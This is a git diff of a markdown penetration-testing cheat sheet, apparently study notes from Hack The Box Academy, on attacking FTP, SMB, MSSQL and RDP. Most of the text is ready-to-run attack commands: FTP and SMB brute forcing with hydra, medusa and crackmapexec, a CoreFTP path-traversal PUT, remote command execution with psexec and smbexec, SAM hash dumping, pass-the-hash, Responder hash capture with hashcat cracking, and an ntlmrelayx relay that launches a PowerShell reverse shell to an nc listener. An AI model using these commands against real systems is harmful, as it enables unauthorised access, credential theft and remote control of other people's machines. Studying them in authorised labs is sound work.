@@ -1,156 +1,167 @@
-# ATTACKING COMMON SERVICES  
+# ATTACKING COMMON SERVICES
+
+## install impacket script on kali
+
+```bash
+sudo apt install impacket-scripts
+```
 
 ## Attacking FTP
 
-* Port : `21` 
-* [FTP footprinting](../HackTheBox/Academy/Footprinting.md)
-* Process
-    ```bash
-    # Process 
+- Port : `21`
+- [FTP footprinting](../HackTheBox/Academy/Footprinting.md)
+- Process
 
-    # 1 - Enumeration + footprinting module ftp par
-    nmap -sV -sC <IP> -p 21
-    # scan
-    sudo nmap --script-updatedb 
-    find / -type f -name ftp* 2>/dev/null | grep scripts
-    nmap -sV -sC -A --script
-    # ftp-anon verify log of anonymous
-    # ftp-syst display infos
-    # script-trace
+  ```bash
+  # Process
 
-
-
-    # 2 - try anonymous login 
-    # interaction as anonymous
-    ftp <Target-IP> # username and password  : anonymous
+  # 1 - Enumeration + footprinting module ftp par
+  nmap -sV -sC <IP> -p 21
+  # scan
+  sudo nmap --script-updatedb
+  find / -type f -name ftp* 2>/dev/null | grep scripts
+  nmap -sV -sC -A --script
+  # ftp-anon verify log of anonymous
+  # ftp-syst display infos
+  # script-trace
 
 
 
-    # 3 - if anonymous is disabled , try bruteforce
-    medusa -u <UserName> -P <wordlist> -h <IP> -M ftp 
-    # bruteforce alternative with hydra 
-    hydra -l <username> -P <dico> ftp://<ftpAddress>
-
-    # 4 - FTP bounce attack
-    nmap -Pn -v -n -p80 -b <Username>:<Password>@<Exposed-Target> <Main-Target-Non-Exposed>
+  # 2 - try anonymous login
+  # interaction as anonymous
+  ftp <Target-IP> # username and password  : anonymous
 
 
 
-    # telecharger tous les fichiers disponible
-    wget -m --no-passive ftp://<anonymous | Username >:< anonymous | password>@10.129.14.136/
-    ```
-* latest vulnerabilities
-    * CoreFTP Exploitation ( Path transversal vulnerability)
-        ```bash
+  # 3 - if anonymous is disabled , try bruteforce
+  medusa -u <UserName> -P <wordlist> -h <IP> -M ftp
+  # bruteforce alternative with hydra
+  hydra -l <username> -P <dico> ftp://<ftpAddress>
+
+  # 4 - FTP bounce attack
+  nmap -Pn -v -n -p80 -b <Username>:<Password>@<Exposed-Target> <Main-Target-Non-Exposed>
+
+
+
+  # telecharger tous les fichiers disponible
+  wget -m --no-passive ftp://<anonymous | Username >:< anonymous | password>@10.129.14.136/
+  ```
+
+- latest vulnerabilities \* CoreFTP Exploitation ( Path transversal vulnerability)
+  `bash
         curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
         # creer whoops et met POC. à l'interieur
-        ```
-**Ressource**
-[Tools and method to bruteforce ftp](https://null-byte.wonderhowto.com/how-to/brute-force-ftp-credentials-get-server-access-0208763/)
+        `
+  **Ressource**
+  [Tools and method to bruteforce ftp](https://null-byte.wonderhowto.com/how-to/brute-force-ftp-credentials-get-server-access-0208763/)
+
 ## Attacking SMB
 
-* [SMB footprinting](../HackTheBox/Academy/Footprinting.md)
+- [SMB footprinting](../HackTheBox/Academy/Footprinting.md)
 
-* Misconfigurations
-    ```bash
-    # scan nmap 
-    sudo nmap <IP> -sV -sC -p139,445
+- Misconfigurations
 
-    # 1 -  connect to a share
-    smbclient -N -L //<Target-IP> --user=<UserName>%<Password>
-    # 2 - Enumerate share with smbmap
-    smbmap -H <Target-IP> # -r <ShareName> | --< download | upload > "<Share-File-Path>" -u <userName> -p '<Password>'
-    # 3 - Domain enum
-    rpcclient -U "%" <IP-Target>
-    enumdomusers
-    # 3 - Alternative
-    ./enum4linux-ng.py <IP-Target> -A -C
-    ```
+  ```bash
+  # scan nmap
+  sudo nmap <IP> -sV -sC -p139,445
 
-- Protocol Specifics Attacks
-    ```bash
-     # bruteforce
-     crackmapexec smb <Target-IP> -u <Wordlist-user> -p '<password>' --local-auth
-     
-     # RCE
-     impacket-psexec <User>:'<Password>'@<Target-IP>
-     # RCE with crackmapexec 
-     crackmapexec smb <Target-IP> -u <User> -p '<Password>' -x '<whoami | powershell-cmd>' --exec-method smbexec
+  # 1 -  connect to a share
+  smbclient -N -L //<Target-IP> --user=<UserName>%<Password>
+  # 2 - Enumerate share with smbmap
+  smbmap -H <Target-IP> # -r <ShareName> | --< download | upload > "<Share-File-Path>" -u <userName> -p '<Password>'
+  # 3 - Domain enum
+  rpcclient -U "%" <IP-Target>
+  enumdomusers
+  # 3 - Alternative
+  ./enum4linux-ng.py <IP-Target> -A -C
+  ```
 
-     #Enumerate logged user 
-     crackmapexec smb <Target-IP> -u <User> -p '<Password>' --loggedon-users
+* Protocol Specifics Attacks
 
-     # extract hash from sam db 
-     --sam
+  ```bash
+   # bruteforce
+   crackmapexec smb <Target-IP> -u <Wordlist-user> -p '<password>' --local-auth
 
-     # Pass-the-Hash (PtH) : authenticate with remote server via NTLM Hash
-     crackmapexec smb <Target-IP> -u <User-Name> -H <HASH>
-    ```
+   # RCE
+   impacket-psexec <User>:'<Password>'@<Target-IP>
+   # RCE with crackmapexec
+   crackmapexec smb <Target-IP> -u <User> -p '<Password>' -x '<whoami | powershell-cmd>' --exec-method smbexec
 
-- Forced Authentication Attacks
-    ```bash
-    # Abuse smb
-    Forced Authentication Attacks
-    responder -I <interface name>
-
-    #2 - copy hash from : /usr/share/responder/logs/
-
-    #3 - Use hashcat 5600 to crack it 
-    hashcat -m 5600 <Hash-File> < Wordlist | rockyou >
+  # RCE with smbexec
 
 
-    # 3 - Crack alternative : impacket-ntlmrelayx
-    cat /etc/responder/Responder.conf | grep 'SMB ='
-    impacket-ntlmrelayx --no-http-server -smb2support -t <Target-IP>
+   #Enumerate logged user
+   crackmapexec smb <Target-IP> -u <User> -p '<Password>' --loggedon-users
 
-    # 4 - revershell with https://www.revshells.com/ + Powershell #3
-    impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c '<Powershell-CMD>'
-    # in parallel on our marchine
-    nc -lvnp 9001
-    ```
+   # extract hash from sam db
+   --sam
+
+   # Pass-the-Hash (PtH) : authenticate with remote server via NTLM Hash
+   crackmapexec smb <Target-IP> -u <User-Name> -H <HASH>
+  ```
+
+* Forced Authentication Attacks ( create fake smb server)
+
+  ```bash
+  # Abuse smb
+  Forced Authentication Attacks
+  responder -I <interface name>
+
+  #2 - copy hash from : /usr/share/responder/logs/
+
+  #3 - Use hashcat 5600 to crack it
+  hashcat -m 5600 <Hash-File> < Wordlist | rockyou >
 
 
-* latest vulnerabilities
-    * [SMBGhost (CVE-2020-0796)](https://www.exploit-db.com/exploits/48537)
+  # 3 - Crack alternative : impacket-ntlmrelayx ( need to be set to off )
+  cat /etc/responder/Responder.conf | grep 'SMB ='
+  impacket-ntlmrelayx --no-http-server -smb2support -t <Target-IP>
 
+  # 4 - revershell with https://www.revshells.com/ + Powershell #3
+  impacket-ntlmrelayx --no-http-server -smb2support -t <targetIP> -c '<Powershell-CMD>'
+  # in parallel on our marchine
+  nc -lvnp 9001
+  ```
+
+- latest vulnerabilities
+  - [SMBGhost (CVE-2020-0796)](https://www.exploit-db.com/exploits/48537)
 
 ## Attacking SQL DB
-*  [SQL Basics](../HackTheBox/Academy/SQL%20basics.md)
-* [ MSSQL footprinting](../HackTheBox/Academy/Footprinting.md)
 
-* 
-    ```bash
-     # scan 1
-     nmap -Pn -sV -sC -p1433 <IP>
-     # scan 2
-     sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
+- [SQL Basics](../HackTheBox/Academy/SQL%20basics.md)
+- [ MSSQL footprinting](../HackTheBox/Academy/Footprinting.md)
 
-     # connect to sqlserver alternative to other modules
-     sqlcmd -S SRVMSSQL -U <Username> -P '<Password>' -y 30 -Y 30
+- ```bash
+   # scan 1
+   nmap -Pn -sV -sC -p1433 <IP>
+   # scan 2
+   sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
 
-     # alternative 2
-     sqsh -S 10.129.203.7 -U <Username> -P '<Password>' -h
-     sqsh -S 10.129.203.7 -U .\\<Username> -P '<Password>' -h
+   # connect to sqlserver alternative to other modules
+   sqlcmd -S SRVMSSQL -U <Username> -P '<Password>' -y 30 -Y 30
 
-     # alternative mssql
-     mssqlclient.py Administrator@<IP> -windows-auth
+   # alternative 2
+   sqsh -S 10.129.203.7 -U <Username> -P '<Password>' -h
+   sqsh -S 10.129.203.7 -U .\\<Username> -P '<Password>' -h
 
-     
-    ```
+   # alternative mssql
+   mssqlclient.py Administrator@<IP> -windows-auth
 
-* latest vulnerabilities
-    * MSSQL function xp_dirtree : we can intercept the hash with Wireshark of TCPDump... and localy crack it to gain admin privilege
 
+  ```
+
+- latest vulnerabilities
+  - MSSQL function xp_dirtree : we can intercept the hash with Wireshark of TCPDump... and localy crack it to gain admin privilege
 
 ## Attacking RDP
 
-* latest vulnerabilities : 
-    * [CVE-2019-0708](https://unit42.paloaltonetworks.com/exploitation-of-windows-cve-2019-0708-bluekeep-three-ways-to-write-data-into-the-kernel-with-rdp-pdu/) 
-        * ` Bluekeep ` is  : User-After-Free vulnerability `risk blue screen prevent client during pentest`
-        * [Article](https://unit42.paloaltonetworks.com/exploitation-of-windows-cve-2019-0708-bluekeep-three-ways-to-write-data-into-the-kernel-with-rdp-pdu/)
-    
+- latest vulnerabilities :
+  - [CVE-2019-0708](https://unit42.paloaltonetworks.com/exploitation-of-windows-cve-2019-0708-bluekeep-three-ways-to-write-data-into-the-kernel-with-rdp-pdu/)
+    - `Bluekeep` is : User-After-Free vulnerability `risk blue screen prevent client during pentest`
+    - [Article](https://unit42.paloaltonetworks.com/exploitation-of-windows-cve-2019-0708-bluekeep-three-ways-to-write-data-into-the-kernel-with-rdp-pdu/)
 
 ###### SMB
+
 ```bash
 # connect to share in windows cmd
 net use n: \\<IP>\<ShareName> /user:<Username> <Password>
@@ -169,7 +180,7 @@ New-PSDrive -Name "N" -Root "\\<IP>\<ShareName>" -PSProvider "FileSystem"  -Cred
 Get-ChildItem -Recurse -Path <DiskPart | N>:\ -Include *<File-Name-Part>* -File
 
 # with windows cmd
-dir <Drive-To-search | n>: /a-d /s /b | find /c ":\ "  # ":\" 
+dir <Drive-To-search | n>: /a-d /s /b | find /c ":\ "  # ":\"
 # search file windows cmd
 dir <Drive-To-search> | n:>\*<File-Name-Part>* /s /b
 
@@ -193,11 +204,11 @@ mount -t cifs //192.168.220.129/<ShareName> /mnt/<ShareName> -o credentials=</pa
 
 # search in the share cred files
 grep -rn <localSharePath> -ie cred
-# search in share a file 
+# search in share a file
 find <localSharePath> -name *<FileNamePart>*
 ```
 
-###### 
+######
 
 ```bash
 # install evolution
